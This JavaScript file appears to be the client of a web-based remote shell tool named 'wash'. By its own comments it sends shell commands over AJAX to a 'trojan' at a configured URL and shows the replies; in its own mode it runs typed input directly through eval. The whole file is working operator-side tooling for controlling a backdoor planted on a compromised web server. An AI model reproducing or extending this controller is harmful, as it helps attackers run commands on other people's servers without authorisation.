// this is the top-level application object
var wash = {

    // store the version number (sometimes this is handy)
    version: '1.0.0',

    // processes commands on the wash prompt
    process: function(command){
        // parse out the wash action
        if(shell.prompt.mode.get() == 'wash'){
            // process wash commands as pure JavaScript. This allows for
            // some tremendous extensibility
            try{
                eval(command);
            }catch(e){
                shell.output.write('wash error: Invalid command.', 'output wash_error');
            }
        }
        
        // if the prompt is not in wash mode, default to shell action
        else {
            wash.command.action = 'shell';
            wash.command.cmd    = command;
            //wash.command.crypto.encrypt();
            wash.send_and_receive();
        }
    },

    // sends a command to the trojan
    send_and_receive: function(){
        // make the AJAX request to the trojan
        $.ajax({
            type : wash.connection.request_type,
            url  : wash.connection.protocol + '://' + wash.connection.url,
            data : wash.command,
        }).done(function(response){
            wash.response = JSON.parse(response);
            var output_class = 'blah';
            shell.output.write(wash.response.output , 'output ' + output_class);
            shell.prompt.context.set(wash.response.prompt_context);
        });
    }
}
